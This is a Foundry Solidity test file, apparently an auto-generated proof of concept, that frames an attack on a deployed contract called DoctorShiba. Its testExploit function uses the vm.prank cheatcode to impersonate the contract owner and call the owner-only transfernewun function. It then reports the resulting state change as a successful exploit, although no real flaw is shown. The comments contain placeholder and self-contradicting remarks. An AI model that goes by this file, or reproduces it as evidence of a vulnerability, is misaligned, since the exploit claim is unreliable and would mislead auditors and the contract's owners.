// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface DoctorShiba {
    function owner() external view returns (address);
    function transfernewun(address _newun) external;
    function newun() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);
    address constant victim = address(0x1234567890123456789012345678901234567890); // Example victim address - should be replaced with actual victim
    // Note: In actual test, victim would be defined in the test template

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // First, get the current owner
        address owner = DoctorShiba(TARGET).owner();

        // Impersonate the owner and call transfernewun
        vm.prank(owner);
        DoctorShiba(TARGET).transfernewun(victim);

        // Verify the exploit worked
        address currentNewun = DoctorShiba(TARGET).newun();
        require(currentNewun == victim, "newun not set to victim address");
        assertEq(currentNewun, victim, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
